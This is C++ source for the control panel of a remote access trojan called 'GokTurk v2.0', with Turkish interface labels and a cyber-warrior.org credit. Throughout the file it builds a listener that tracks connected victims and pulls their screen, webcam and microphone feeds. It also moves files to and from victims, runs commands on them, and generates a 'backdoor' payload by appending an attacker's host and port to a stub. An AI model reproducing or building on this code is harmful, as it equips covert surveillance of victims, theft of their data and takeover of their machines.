#include "../include/gokturkgui.h"

using namespace Gtk;


GokturkGui::GokturkGui(BaseObjectType* cobject, const Glib::RefPtr<Gtk::Builder>& refGlade)
    : Gtk::Window(cobject), builder(refGlade)
{
    set_title("GokTurk v2.0 | AR-GE");
    builder->get_widget("m_image1",  m_image1);
    builder->get_widget("m_window2", m_window2);

    builder->get_widget("m_window4", m_window4);
    builder->get_widget("m_window6", m_window6);
    builder->get_widget("m_window7", m_window7);
    builder->get_widget("m_treeview",m_treeview);
//buttons on the window1
    builder->get_widget("m_setbtn",  m_setbtn);
    builder->get_widget("m_scrbtn",  m_scrbtn);
    builder->get_widget("m_cambtn",  m_cambtn);
    builder->get_widget("m_micbtn",  m_micbtn);
    builder->get_widget("m_cmdbtn",  m_cmdbtn);
    builder->get_widget("m_crtbtn",  m_crtbtn);
    builder->get_widget("m_aboutbtn",  m_aboutbtn);
    builder->get_widget("m_linkbtn",  m_linkbtn);
//buttons on the window2
    builder->get_widget("m_startbtn",m_startbtn);
    builder->get_widget("m_stopbtn", m_stopbtn);
    builder->get_widget("m_porttxt", m_porttxt);
//window4
    builder->get_widget("m_cmdtxt",m_cmdtxt);
    builder->get_widget("m_cmdview", m_cmdview);

//window6
    builder->get_widget("m_crthosttxt",m_crthosttxt);
    builder->get_widget("m_crtporttxt", m_crtporttxt);
    builder->get_widget("m_crtcreatebtn", m_crtcreatebtn);


//signal handlers for buttons on the window1
    m_setbtn->signal_clicked().connect(sigc::mem_fun(*this, &GokturkGui::m_setbtn_clicked));
    m_scrbtn->signal_clicked().connect(sigc::mem_fun(*this, &GokturkGui::m_scrbtn_clicked));
    m_cambtn->signal_clicked().connect(sigc::mem_fun(*this, &GokturkGui::m_cambtn_clicked));
    m_micbtn->signal_clicked().connect(sigc::mem_fun(*this, &GokturkGui::m_micbtn_clicked));
    m_cmdbtn->signal_clicked().connect(sigc::mem_fun(*this, &GokturkGui::m_cmdbtn_clicked));
    m_crtbtn->signal_clicked().connect(sigc::mem_fun(*this, &GokturkGui::m_crtbtn_clicked));
    m_aboutbtn->signal_clicked().connect(sigc::mem_fun(*this, &GokturkGui::m_aboutbtn_clicked));

    m_cmdtxt->signal_activate().connect(sigc::mem_fun(*this, &GokturkGui::command_txt_enter_key_press));
//signal handlers for buttons on the window2
    m_startbtn->signal_clicked().connect(sigc::mem_fun(*this, &GokturkGui::m_startbtn_clicked));
    m_stopbtn->signal_clicked().connect(sigc::mem_fun(*this, &GokturkGui::m_stopbtn_clicked));

    m_crtcreatebtn->signal_clicked().connect(sigc::mem_fun(*this, &GokturkGui::m_crtcreatebtn_clicked));
//set items
    m_window2->set_title("Ayarlar");
    m_window4->set_title("Terminal");
    m_window6->set_title("Editor");
    m_image1->set("ui/img/banner.png");

    m_cmdview->set_editable(false);
    m_cmdtxt->set_max_length(50000);

    m_treeview->append_column("ID", m_Columns.m_id);
    m_treeview->append_column("Kullanıcı Adı", m_Columns.m_username);
    m_treeview->append_column("Bilgisayar Adı", m_Columns.m_computername);
    m_treeview->append_column("IP Adres", m_Columns.m_ipaddress);
    m_treeview->append_column("Erişim Tipi", m_Columns.m_accesstype);
    m_treeview->append_column("Masaüstü", m_Columns.m_desktoptype);
}

int GokturkGui::sendFileThread(int selectId)
{
std::lock_guard<std::mutex> senderGuard(m_DataMutex);
    std::ifstream fileRead;

    fileRead.open(localprocPath.c_str(), std::ios::binary | std::ios::ate);

    if(!fileRead.is_open())
    {
        //
    }
    upfileInfo1.packetType = UPLFLE;
    upfileInfo1.bufferSize = fileRead.tellg();
    fileRead.seekg(0);
    ssize_t result = tcpServer1.sendData(selectId, &upfileInfo1, sizeof(upfileInfo1));

    char * fileBuffer = new char[upfileInfo1.bufferSize];

    fileRead.read(fileBuffer, upfileInfo1.bufferSize);
    fileRead.close();

    FilePacket filePacket1{};
    filePacket1.packetType = PCKFLE;

    DivPacket fileDivPacket1(fileBuffer, upfileInfo1.bufferSize, 50000);

    for(size_t i=0; i < fileDivPacket1.getIter(); ++i)
    {
        std::memcpy(filePacket1.packetBuffer, fileDivPacket1.getPtr(i), fileDivPacket1.getSize(i));
        filePacket1.packetSize = fileDivPacket1.getSize(i);
        int senderSize = 50000 - fileDivPacket1.getSize(i);
        result = tcpServer1.sendData(selectId ,&filePacket1, sizeof(filePacket1) - senderSize);
        if(result <= 0){
            //
        }
    }

    delete [] fileBuffer;
    return  0;
}


Glib::ustring processPath(Glib::ustring cmd)
{
    size_t firstPoint = cmd.find("/");
    size_t lastPoint  = cmd.find("k=/")-1;
    size_t length     = lastPoint - firstPoint;
    return cmd.substr(firstPoint, length);
}

Glib::ustring savePath(Glib::ustring cmd)
{
    size_t firstPoint = cmd.find("k=/")+2;
    size_t lastPoint  = cmd.size();
    size_t length     = lastPoint - firstPoint;
    return cmd.substr(firstPoint, length);
}

void GokturkGui::command_txt_enter_key_press()
{

    Glib::ustring strBuffer = "<cmd> " + m_cmdtxt->get_text() + '\n';
    auto refBuffer = m_cmdview->get_buffer();
    auto iter = refBuffer->end();
    refBuffer->insert(iter, strBuffer.c_str());
    m_cmdview->set_buffer(refBuffer);
    Glib::ustring cmd = m_cmdtxt->get_text();//"#indir /etc/dev/test.txt k=/etc/download/connection f,şe/test.txt";
    int selectID = getSelection();

    ssize_t result;
    if(selectID != -1)
    {
        if(cmd.compare(0,6,"#indir") ==0 )
        {
            Glib::ustring procPath;
            procPath = processPath(cmd);
            savePth = savePath(cmd);
            FileInfo fileInfo1{};
            fileInfo1.packetType = DWNFLE;
            procPath.copy(fileInfo1.filePath, procPath.length(), 0);
            std::lock_guard<std::mutex> senderGuard(m_DataMutex);
            result = tcpServer1.sendData(selectID, &fileInfo1, sizeof(fileInfo1));

            std::thread dwnThread(&GokturkGui::receiveThread, this, selectID);
            dwnThread.detach();
        }
        else if(cmd.compare(0,6,"#yukle") ==0)
        {
            Glib::ustring savingPath;
            localprocPath = processPath(cmd);
            savingPath = savePath(cmd);

            savingPath.copy(upfileInfo1.filePath, savingPath.length(), 0);

            std::thread uplThread(&GokturkGui::sendFileThread, this, selectID );
            uplThread.detach();
        }
        else
        {

                CmdInfo cmdInfo1{};
                cmdInfo1.packetType = INFCMD;
                cmd.copy(cmdInfo1.packetBuffer, cmd.length() , 0);
                std::lock_guard<std::mutex> senderGuard(m_DataMutex);
                tcpServer1.sendData(selectID, &cmdInfo1, sizeof(cmdInfo1));
                std::thread cmdThread(&GokturkGui::receiveThread, this, selectID);
                cmdThread.detach();

        }
    }
    m_cmdtxt->set_text("");
}


int GokturkGui::getSelection(){

    Glib::RefPtr<Gtk::TreeSelection> refTreeSelection = m_treeview->get_selection();
    TreeModel::iterator iter = refTreeSelection->get_selected();

    if(iter)
    {
        TreeModel::Row row = *iter;
        return row.get_value(m_Columns2.m_id);

    }
    return -1;
}

void GokturkGui::m_setbtn_clicked(){

    m_window2->show();

}

int GokturkGui::screenRequest(int selectID)
{
    PackTypes scrPacketTypes1;
    scrPacketTypes1 = INFSCR;

    return tcpServer1.sendData(selectID, &scrPacketTypes1, sizeof(scrPacketTypes1));
}

int GokturkGui::cameraRequest(int selectID)
{
    PackTypes camPacketTypes1;
    camPacketTypes1 = INFCAM;

    return tcpServer1.sendData(selectID, &camPacketTypes1, sizeof(camPacketTypes1));
}

int GokturkGui::microphomeRequest(int selectID)
{
    PackTypes micPacketTypes1;
    micPacketTypes1 = INFAUD;

    return tcpServer1.sendData(selectID, &micPacketTypes1, sizeof(micPacketTypes1));
}


int GokturkGui::receiveThread(int selectId){

    PackTypes receivePacket1;
    ssize_t result;

    //cout << "[OPEN THREAD]" << endl;

    while(true){

        receivePacket1 = NULLTP;
        std::lock_guard<std::mutex> whileGuard(m_DataMutex);
        result = tcpServer1.recvData(selectId, &receivePacket1, sizeof(receivePacket1));

        if(result <= 0)
        {


            return 0;
        }

        switch(receivePacket1)
        {
            case INFSCR:
            {

                result = tcpServer1.recvData(selectId, &screenInfo1.bufferSize, sizeof(screenInfo1) - sizeof(receivePacket1));
                if(result <= 0)
                {


                    return 0;
                }
                sumScreenPacket1.createBuffer(screenInfo1.compressSize);

            }
            break;

            case PCKSCR:
            {

                result = tcpServer1.recvData(selectId, &screenPacket1.packetSize, sizeof(int));
                if(result <= 0)
                {


                    return 0;
                }
                result = tcpServer1.recvData(selectId, screenPacket1.packetBuffer, screenPacket1.packetSize);
                if(result <= 0)
                {


                    return 0;
                }
                sumScreenPacket1.add(screenPacket1.packetBuffer, screenPacket1.packetSize);


                if(sumScreenPacket1.copleted() == true)
                {

                    if(desktopScreen1.is_Closed() != true)
                    {

                        desktopScreen1.renderDisplay(screenInfo1.compressSize, screenInfo1.width, screenInfo1.height, sumScreenPacket1.getBuffer());
                        sumScreenPacket1.deleteBuffer();


                        PackTypes scrPacketTypes1;
                        scrPacketTypes1 = INFSCR;
                        result = tcpServer1.sendData(selectId, &scrPacketTypes1, sizeof(scrPacketTypes1));
                        if(result <= 0)
                        {


                            return 0;
                        }
                    }else
                    {

                        sumScreenPacket1.deleteBuffer();

                        return 0;

                    }
                }

            }
            break;

            case INFCAM:
            {

                result = tcpServer1.recvData(selectId, &cameraInfo1.bufferSize, sizeof(cameraInfo1) - sizeof(receivePacket1));
                if(result <= 0)
                {


                    return 0;
                }
                sumCameraPacket1.createBuffer(cameraInfo1.bufferSize);

            }
            break;

            case PCKCAM:
            {

                result = tcpServer1.recvData(selectId, &cameraPacket1.packetSize, sizeof(int));
                if(result <= 0)
                {


                    return 0;
                }
                result = tcpServer1.recvData(selectId, cameraPacket1.packetBuffer, cameraPacket1.packetSize);
                if(result <= 0)
                {


                    return 0;
                }
                sumCameraPacket1.add(cameraPacket1.packetBuffer, cameraPacket1.packetSize);

                if(sumCameraPacket1.copleted() == true)
                {
                    if(camScreen1.is_Closed() != true)
                    {

                        camScreen1.renderDisplay(sumCameraPacket1.getBuffer(), sumCameraPacket1.getSize() );
                        sumCameraPacket1.deleteBuffer();

                        PackTypes camPacketTypes1;
                        camPacketTypes1 = INFCAM;
                        result = tcpServer1.sendData(selectId, &camPacketTypes1, sizeof(camPacketTypes1));
                        if(result <= 0)
                        {


                            return 0;
                        }
                    }else
                    {
                        PackTypes camPacketTypes1;
                        camPacketTypes1 = OFFCAM;
                        result = tcpServer1.sendData(selectId, &camPacketTypes1, sizeof(camPacketTypes1));
                        if(result <= 0)
                        {
                            sumCameraPacket1.deleteBuffer();

                            return 0;
                        }

                        sumCameraPacket1.deleteBuffer();

                        return 0;
                    }
                }

            }
            break;
            case PCKAUD:
            {

                result = tcpServer1.recvData(selectId, microPacket1.packetBuffer, 49152);
                if(result <= 0)
                {
                    sumMicroPacket1.deleteBuffer();
                    m_btn = true;

                    return 0;
                }
                sumMicroPacket1.add(microPacket1.packetBuffer, 49152);

                if(sumMicroPacket1.copleted() == true)
                {
                        Player player1(44100,256, 40 *48);
                        player1.openDevice("default");
                        player1.playRecord(sumMicroPacket1.getBuffer());
                        player1.closeDevice();
                        sumMicroPacket1.deleteBuffer();
                        m_btn = true;
                        return 0;
                }

            }
            break;
            case PCKCMD:
            {
                CmdPacket cmdPacket1{};

                result = tcpServer1.recvData(selectId, cmdPacket1.packetBuffer, 200000);
                Glib::ustring strBuffer = cmdPacket1.packetBuffer ;
                auto refBuffer = m_cmdview->get_buffer();
                auto iter = refBuffer->end();
                refBuffer->insert(iter, strBuffer.c_str());
                m_cmdview->set_buffer(refBuffer);

                return 0;

            }
            break;

            case DWNFLE:
            {
                result = tcpServer1.recvData(selectId, &downFileInfo1.filePath, sizeof(downFileInfo1) - sizeof(receivePacket1));
                if(result <= 0)
                {


                    return 0;
                }
                sumFilePacket1.createBuffer(downFileInfo1.bufferSize);

            }
            break;

            case PCKFLE:
            {

                result = tcpServer1.recvData(selectId, &downFilePacket1.packetSize, sizeof(int));

                if(result <= 0)
                {
                    return 0;
                }

                result = tcpServer1.recvData(selectId, downFilePacket1.packetBuffer, downFilePacket1.packetSize);
                if(result <= 0)
                {
                    return 0;
                }

                sumFilePacket1.add(downFilePacket1.packetBuffer, downFilePacket1.packetSize);

                if(sumFilePacket1.copleted() == true)
                {
                    std::ofstream saveFile;
                    saveFile.open(savePth.c_str(), std::ios::binary);

                    if(!saveFile.is_open())
                    {
                        sumFilePacket1.deleteBuffer();
                        return 0;
                    }

                    saveFile.write(sumFilePacket1.getBuffer(),sumFilePacket1.getSize());
                    saveFile.close();
                    sumFilePacket1.deleteBuffer();

                    return 0;
                }
            }
            break;

            default:
          break;
        }
    }

 return 0;
}


void GokturkGui::m_scrbtn_clicked()
{
    std::lock_guard<std::mutex> senderGuard(m_DataMutex);
    int selectID = getSelection();
    if(selectID != -1 && desktopScreen1.is_Closed() == true)
    {
        desktopScreen1.onShow();
        screenRequest(selectID);
        std::thread screenThread(&GokturkGui::receiveThread, this, selectID);
        screenThread.detach();
    }

}

void GokturkGui::m_cambtn_clicked()
{
    std::lock_guard<std::mutex> senderGuard(m_DataMutex);
    int selectID = getSelection();
    if(selectID != -1 && camScreen1.is_Closed() == true)
    {
        camScreen1.onShow();
        cameraRequest(selectID);
        std::thread cameraThread(&GokturkGui::receiveThread, this, selectID);
        cameraThread.detach();
    }

}

void GokturkGui::m_micbtn_clicked()
{
    std::lock_guard<std::mutex> senderGuard(m_DataMutex);
    int selectID = getSelection();

    if(selectID != -1 && m_btn != false )
    {
        m_btn = false;
        sumMicroPacket1.createBuffer(1966080);
        microphomeRequest(selectID);
        std::thread microThread(&GokturkGui::receiveThread, this, selectID);
        microThread.detach();

    }

}

void GokturkGui::m_cmdbtn_clicked()
{
    m_window4->show();
}

void GokturkGui::m_crtbtn_clicked()
{
    m_window6->show();
}



void GokturkGui::acceptThread(){

    m_refTreeModel = Gtk::ListStore::create(m_Columns);
    m_treeview->set_model(m_refTreeModel);

    while(m_Loop == true)
    {

        if( tcpServer1.acceptConnections() >= 0)
        {
            if(m_Loop == true)
            {
                int i = tcpServer1.getConnections().size() -1;
                Gtk::TreeModel::Row row = *(m_refTreeModel->append());
                row[m_Columns.m_id] = i;
                row[m_Columns.m_username] = tcpServer1.getConnections()[i].username;
                row[m_Columns.m_computername] = tcpServer1.getConnections()[i].hostname;
                row[m_Columns.m_ipaddress] = tcpServer1.getConnections()[i].address;
                row[m_Columns.m_accesstype] = tcpServer1.getConnections()[i].accesstype;
                row[m_Columns.m_desktoptype] = tcpServer1.getConnections()[i].deskname;
            }
        }
    }

}

void GokturkGui::m_startbtn_clicked(){

    Glib::ustring str = m_porttxt->get_text();
    tcpServer1.setListen(std::stoi(str.data()),9999);
    m_Loop = true;
    m_Receiver = true;
    std::thread acceptth(&GokturkGui::acceptThread, this);
    acceptth.detach();

//
    m_startbtn->set_sensitive(false);
    m_stopbtn->set_sensitive(true);
}


void GokturkGui::m_stopbtn_clicked() {

    m_Loop = false;
    m_Receiver = false;
    m_refTreeModel->clear();
    tcpServer1.endConnection();

    m_startbtn->set_sensitive(true);
    m_stopbtn->set_sensitive(false);

}

void GokturkGui::m_aboutbtn_clicked(){

    m_window7->show();
    m_linkbtn->set_label("www.cyber-warrior.org");
}

void GokturkGui::m_crtcreatebtn_clicked(){

    std::ifstream readStub;
    std::ofstream writeStub;
    ConfigData configData1{};
    Glib::ustring host = m_crthosttxt->get_text();
    Glib::ustring port = m_crtporttxt->get_text();
    host.copy(configData1.host, host.length(), 0);
    configData1.port = atoi(port.c_str());

    readStub.open("./ui/backdoor.stb", std::ios::binary | std::ios::ate);
    if(!readStub.is_open())
    {


    }else{

        size_t bufferSize = readStub.tellg();
        readStub.seekg(0);
        char * buffer = new char[bufferSize];
        readStub.read(buffer, bufferSize);
        readStub.close();
        writeStub.open("./backdoor", std::ios::binary);
        writeStub.write(buffer, bufferSize);
        writeStub.write((char*)&configData1, sizeof(configData1));
        writeStub.close();
    }

}



